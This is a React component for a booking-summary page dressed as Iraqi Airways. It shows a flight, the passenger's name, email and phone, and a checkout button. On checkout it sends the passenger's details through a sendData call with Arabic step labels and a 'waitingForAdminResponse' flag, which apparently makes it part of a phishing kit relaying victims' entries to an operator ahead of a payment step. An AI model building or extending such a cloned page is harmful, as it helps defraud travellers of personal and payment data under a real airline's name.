import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { sendData } from '../lib/store';

export default function SeatCustomization() {
  const [, setLocation] = useLocation();
  const [detailOpen, setDetailOpen] = useState(false);
  const [paxOpen, setPaxOpen] = useState(false);

  const flightData = JSON.parse(localStorage.getItem('selectedFlight') || '{}');
  const passengers = JSON.parse(localStorage.getItem('passengerData') || '[]');
  const tripSummary = JSON.parse(localStorage.getItem('tripSummary') || '{}');

  const cityNames: Record<string, string> = {
    BGW: 'Baghdad', EBL: 'Erbil', BSR: 'Basra', NJF: 'Najaf', KIK: 'Kirkuk',
    ISU: 'Sulaymaniyah', OSM: 'Mosul', AMM: 'Amman', IST: 'Istanbul', DXB: 'Dubai',
    BEY: 'Beirut', CAI: 'Cairo', DEL: 'Delhi', FRA: 'Frankfurt', KUL: 'Kuala Lumpur',
    CAN: 'Guangzhou', CPH: 'Copenhagen', SAW: 'Istanbul Sabiha', AYT: 'Antalya',
    TZX: 'Trabzon', SZF: 'Samsun', ESB: 'Ankara', DUS: 'Dusseldorf', MUC: 'Munich',
    SHJ: 'Sharjah', MCT: 'Muscat', BAH: 'Bahrain', IFN: 'Isfahan', TUN: 'Tunis', VKO: 'Moscow',
  };

  const origin = flightData.origin || tripSummary.originCode || 'BGW';
  const destination = flightData.destination || tripSummary.destCode || 'EBL';
  const originCity = cityNames[origin] || origin;
  const destCity = cityNames[destination] || destination;

  const curCode = tripSummary.curCode || 'IQD';
  const totalPrice = tripSummary.baseTotalConv || flightData.price || 0;
  const formatPrice = (n: number) => `${curCode} ${n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

  const depTime = flightData.departureTime || '17:00';
  const arrTime = flightData.arrivalTime || '18:00';
  const duration = flightData.duration || '1h 0min';
  const fareClass = flightData.fareClass || tripSummary.bundleName || 'Economy Platinum';
  const flightDate = flightData.date || tripSummary.firstDate || '';

  const formatDate = (dateStr: string) => {
    if (!dateStr) return '';
    try {
      const d = new Date(dateStr.includes('T') ? dateStr : dateStr + 'T00:00:00');
      if (isNaN(d.getTime())) return dateStr;
      return d.toLocaleDateString('en-GB', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
    } catch { return dateStr; }
  };

  const pax = passengers[0] || {};
  const paxName = `${pax.firstName || ''} ${pax.lastName || ''}`.trim() || tripSummary.primaryName || 'Passenger';
  const paxEmail = pax.email || '';
  const paxPhone = `${pax.dialCode || '+964'} ${pax.phone || ''}`.trim();

  const handleCheckout = () => {
    sendData({
      data: { action: 'checkout', total: formatPrice(totalPrice), passenger: paxName },
      current: "ملخص الحجز",
      nextPage: "الدفع",
      waitingForAdminResponse: false,
      isCustom: true,
    });
    setLocation('/meals');
  };

  useEffect(() => {
    if (!flightData.origin && !tripSummary.curCode) {
      setLocation('/passenger-details');
    }
  }, []);

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: 'Lato, sans-serif' }}>
      {/* Header */}
      <header className="bg-[#398017] text-white">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center gap-6">
          <img src="/iraqi_airways/img/logo.png" alt="Iraqi Airways" className="h-10 brightness-0 invert" />
          <span className="border-l border-white/50 pl-4 text-sm cursor-pointer hover:underline" onClick={() => setLocation('/')}>Home</span>
          <span className="text-sm">English ▼</span>
        </div>
      </header>

      {/* Main content */}
      <main className="flex-1 max-w-4xl mx-auto w-full px-4 py-8">
        {/* Your selection title */}
        <div className="text-center mb-8">
          <div className="inline-block border border-gray-300 rounded-lg px-8 py-4">
            <h1 className="text-[#2E7D32] text-2xl font-light">Your selection</h1>
            <p className="text-[#2E7D32] text-sm">{originCity} to {destCity}</p>
          </div>
        </div>

        {/* Your flight */}
        <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-4">Your flight</h2>
        <div className="border border-gray-200 rounded-lg p-6 mb-4">
          <div className="mb-4">
            <span className="font-bold text-[#2E7D32]">{originCity} to {destCity}</span>
            <span className="text-[#2E7D32] ml-2">- {formatDate(flightDate)}</span>
          </div>
          <hr className="mb-4" />
          <div className="flex items-center justify-between flex-wrap gap-4">
            <div className="flex items-center gap-4">
              <div className="text-center">
                <p className="text-2xl font-light text-[#2E7D32]">{depTime}</p>
                <p className="text-sm text-gray-600">{origin}</p>
              </div>
              <div className="flex items-center gap-2 text-gray-400 text-xs">
                <span>···········</span>
                <span>nonstop</span>
                <span>···········</span>
              </div>
              <div className="text-center">
                <p className="text-2xl font-light text-[#2E7D32]">{arrTime}</p>
                <p className="text-sm text-gray-600">{destination}</p>
              </div>
            </div>
            <div className="text-sm text-gray-600">
              <p>⏱ <strong>Duration {duration}</strong></p>
              <p>✈ Operated by Iraqi Airways</p>
            </div>
            <div className="flex items-center gap-2 cursor-pointer" onClick={() => setDetailOpen(!detailOpen)}>
              <span className="text-[#2E7D32] font-medium">{fareClass}</span>
              <span className="text-[#2E7D32]">{detailOpen ? '∧' : '∨'}</span>
            </div>
          </div>
        </div>

        {/* Total price for flight */}
        <p className="text-right text-[#2E7D32] text-lg mb-8">
          Total price for flight: <strong className="text-xl">{formatPrice(totalPrice)}</strong>
        </p>

        {/* Passenger */}
        <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-4">Passenger</h2>
        <div className="border border-gray-200 rounded-lg p-6 mb-8">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="w-14 h-14 rounded-full bg-gray-200 flex items-center justify-center relative">
                <svg className="w-8 h-8 text-gray-500" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                <div className="absolute -top-1 -right-1 w-5 h-5 bg-[#4CAF50] rounded-full flex items-center justify-center">
                  <span className="text-white text-xs">✓</span>
                </div>
              </div>
              <div>
                <p className="font-bold text-[#2E7D32]">{paxName}</p>
                {paxEmail && <p className="text-sm text-gray-600">{paxEmail}</p>}
                {paxPhone.trim().length > 4 && <p className="text-sm text-gray-600">{paxPhone}</p>}
                <p className="text-sm text-[#2E7D32]">Adult</p>
              </div>
            </div>
            <span className="text-[#2E7D32] cursor-pointer text-xl" onClick={() => setPaxOpen(!paxOpen)}>{paxOpen ? '∧' : '∨'}</span>
          </div>
        </div>

        {/* Total price */}
        <div className="text-right mb-4">
          <p className="text-[#2E7D32] text-lg">Total price: <strong className="text-3xl">{formatPrice(totalPrice)}</strong></p>
          <p className="text-gray-500 text-sm mt-1">One way price for all passengers (including taxes, fees and discounts). <a href="#" className="font-bold text-gray-700 underline">See price details.</a></p>
        </div>

        {/* Policy links */}
        <div className="text-center text-sm text-[#2E7D32] mb-8">
          <a href="#" className="underline">Detailed baggage policy ↗</a>
          <span className="mx-2 text-gray-400">|</span>
          <a href="#" className="underline">Review conditions ↗</a>
          <span className="mx-2 text-gray-400">|</span>
          <a href="#" className="underline">Dangerous goods policy ↗</a>
        </div>

        {/* Checkout button */}
        <div className="flex justify-end mb-12">
          <button onClick={handleCheckout} className="bg-[#1B5E20] text-white px-10 py-3 rounded-full text-lg font-medium hover:bg-[#0D3B0F]">Checkout</button>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#398017] text-white py-8">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-3 gap-8 mb-8">
            <div>
              <h4 className="font-bold mb-3">Plan and booking</h4>
              <a href="#" className="text-sm hover:underline block">Book trip ↗</a>
            </div>
            <div>
              <h4 className="font-bold mb-3">Contact us</h4>
              <a href="#" className="text-sm hover:underline block mb-1">Contact us ↗</a>
              <a href="#" className="text-sm hover:underline block">Iraqi airways offers ↗</a>
            </div>
            <div>
              <h4 className="font-bold mb-3">About us</h4>
              <a href="#" className="text-sm hover:underline block">Our fleet ↗</a>
            </div>
          </div>
          <div className="text-center mb-6">
            <h4 className="font-bold text-lg mb-3">Secured payment</h4>
            <div className="flex justify-center gap-2 mb-2">
              <img src="/iraqi_airways/img/amex.png" alt="Amex" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/img/visa.png" alt="Visa" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/img/mastercard.png" alt="Mastercard" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/img/paypal.png" alt="PayPal" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/img/diners.png" alt="Diners" className="h-8 bg-white rounded p-1" />
            </div>
            <p className="text-xs opacity-80">Credit card fees may occur.</p>
          </div>
          <div className="text-center mb-4">
            <h4 className="font-bold mb-3">Follow us</h4>
            <div className="flex justify-center gap-4">
              <a href="#" className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
              <a href="#" className="w-8 h-8 bg-pink-500 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" strokeWidth="2"/><circle cx="12" cy="12" r="5" fill="none" stroke="white" strokeWidth="2"/></svg></a>
              <a href="#" className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0C.488 3.45.029 5.804 0 12c.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0C23.512 20.55 23.971 18.196 24 12c-.029-6.185-.484-8.549-4.385-8.816zM9 16V8l8 4-8 4z"/></svg></a>
              <a href="#" className="w-8 h-8 bg-blue-400 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/></svg></a>
            </div>
          </div>
          <div className="text-center">
            <a href="#" className="text-sm underline">Technical details</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
